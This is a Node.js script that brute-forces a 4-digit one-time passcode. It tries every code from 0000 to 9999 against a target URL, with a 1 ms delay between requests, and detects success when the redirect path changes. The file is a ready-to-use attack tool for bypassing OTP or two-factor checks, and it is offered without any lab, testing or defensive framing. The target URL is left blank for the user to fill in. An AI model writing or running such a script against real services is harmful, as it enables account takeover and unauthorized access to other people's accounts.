// otp_bruteforce.js
// Node 18+ required (global fetch)
// Usage: node otp_bruteforce.js

const BASE_URL = "https://"; // ajuste para a URL alvo completa,
const ORIGIN_PATH = "/"; // ajuste para a rota que você quer
const END_CODE = 9999;
const DELAY_MS = 1; // 1 millisecond as requested
const REQUEST_TIMEOUT_MS = 8000; // per-request timeout

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

(async () => {
  console.log("Iniciando brute-force (Node). URL alvo:", BASE_URL);
  for (let i = 0; i <= END_CODE; i++) {
    const pin = i.toString().padStart(4, "0");
    const url = `${BASE_URL}&code=${pin}`;

    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), REQUEST_TIMEOUT_MS);

      const resp = await fetch(url, {
        method: "GET",
        redirect: "follow", // segue redirects automaticamente
        signal: controller.signal,
        headers: {
          Accept:
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "User-Agent": "otp-bruter/1.0",
        },
      });
      clearTimeout(timeout);

      const finalUrl = resp.url || url;
      let finalPath = "/";
      try {
        finalPath = new URL(finalUrl).pathname;
      } catch (e) {
        finalPath = finalUrl;
      }

      const body = await resp.text();

      // condição de sucesso: mudança de pathname (mantive essa lógica)
      const pathChanged = finalPath !== ORIGIN_PATH;

      if (pathChanged) {
        console.log(`PIN ${pin}: ✅ SUCCESS - PATH CHANGED to "${finalPath}"`);
        console.log("Final URL:", finalUrl);
        // print a snippet of body if small
        const snippet = body ? body.slice(0, 400).replace(/\s+/g, " ") : "";
        console.log("Body snippet:", snippet ? snippet : "(empty)");
        process.exit(0);
      } else {
        // Falha (sem mudança de rota)
        console.log(`PIN ${pin}: ❌ FAIL (still ${ORIGIN_PATH})`);
      }
    } catch (err) {
      if (err.name === "AbortError") {
        console.log(
          `PIN ${pin}: ❌ ERROR - request timed out (${REQUEST_TIMEOUT_MS} ms)`
        );
      } else {
        console.log(`PIN ${pin}: ❌ ERROR - ${err.message || err}`);
      }
      // continua o loop após erro
    }

    // delay entre tentativas
    if (DELAY_MS > 0) await sleep(DELAY_MS);
  }

  console.log(
    "Loop completo — nenhuma mudança de rota detectada com este token + 0000..9999."
  );
  process.exit(0);
})();
